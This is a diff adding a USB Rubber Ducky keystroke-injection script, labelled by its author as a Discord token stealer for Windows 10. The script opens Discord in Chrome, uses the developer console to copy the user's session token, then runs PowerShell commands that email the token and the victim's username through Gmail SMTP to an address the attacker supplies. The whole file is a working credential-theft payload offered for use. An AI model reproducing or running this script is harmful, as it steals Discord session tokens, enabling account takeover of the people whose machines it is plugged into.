@@ -1,0 +1,142 @@
+REM Author: Guereak
+REM Ducky chrome discord token stealer for Windows 10
+Delay 1000
+REM ----------- opens discord on chrome
+GUI r
+DELAY 500
+STRING chrome
+DELAY 400
+ENTER
+DELAY 600
+STRING discord.com
+DELAY 100
+ENTER
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 2000
+REM -------------------- opens developer console and copies token to clipboard
+CONTROL SHIFT j
+DELAY 1000
+CONTROL RIGHT_BRACKET
+DELAY 100
+CONTROL RIGHT_BRACKET
+DELAY 100
+CONTROL RIGHT_BRACKET 
+DELAY 100
+CONTROL RIGHT_BRACKET
+DELAY 100
+CONTROL RIGHT_BRACKET
+REM ----  non necessary up arrows, can remove if target never uses dev console
+DELAY 100
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+UP
+DELAY 50
+DOWN
+DELAY 50
+DOWN
+DELAY 50
+DOWN
+DELAY 50
+RIGHT
+DELAY 50
+RIGHT
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 100
+CONTROL SHIFT m
+DELAY 100
+STRING token
+DELAY 100
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 100
+TAB
+DELAY 50
+ENTER
+DELAY 100
+CONTROL c
+DELAY 100
+CONTROL SHIFT m
+DELAY 100
+ALT F4
+DELAY 100
+REM -------------- sends it by email using powershell
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 500
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+DELAY 100
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+DELAY 100
+STRING $SMTPInfo.EnableSSL = $true
+ENTER
+DELAY 100
+REM ---Make sure to enable less secure app access to sender's mail here: https://myaccount.google.com/lesssecureapps
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER'S EMAIL HERE@gmail.com', 'PASSWORD')
+ENTER
+DELAY 100
+STRING $SMTPServer = $E = New-Object System.Net.Mail.MailMessage
+ENTER
+DELAY 100
+STRING $E.From = 'SENDER'S MAIL@gmail.com'
+ENTER
+DELAY 100
+STRING $E.To.Add('RECIEVER'S MAIL)
+ENTER
+DELAY 100
+STRING $E.Subject = $env:UserName
+ENTER
+DELAY 100
+STRING $E.Body = 
+DELAY 50
+CONTROL v
+DELAY 50
+ENTER
+DELAY 100
+STRING $F = $SMTPInfo.Send($E)
+ENTER
+DELAY 100
+STRING exit
+ENTER
